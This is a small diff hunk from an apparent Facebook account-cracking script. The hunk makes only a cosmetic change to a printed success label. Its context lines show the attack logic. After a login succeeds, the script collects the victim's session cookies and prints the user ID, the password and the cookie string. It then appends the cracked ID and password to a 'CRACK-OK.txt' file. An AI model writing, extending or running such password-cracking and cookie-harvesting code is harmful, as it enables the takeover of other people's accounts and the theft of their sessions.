@@ -249,7 +249,7 @@ def rcrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[7:22]
-				print('\r\r \033[1;32m[CRACK-OK💉]  ' +uid+ ' | ' +ps+    '  \n \033[1;34m[COOKIE \033[1;91m[🍪] = \033[1;94m'+coki+  ' \n\033[1;95m')
+				print('\r\r \033[1;32m[CRACK.-OK💉]  ' +uid+ ' | ' +ps+    '  \n \033[1;34m[COOKIE \033[1;91m[🍪] = \033[1;94m'+coki+  ' \n\033[1;95m')
 				cek_apk(session,coki)
 				open('/sdcard/CRACK-OK.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
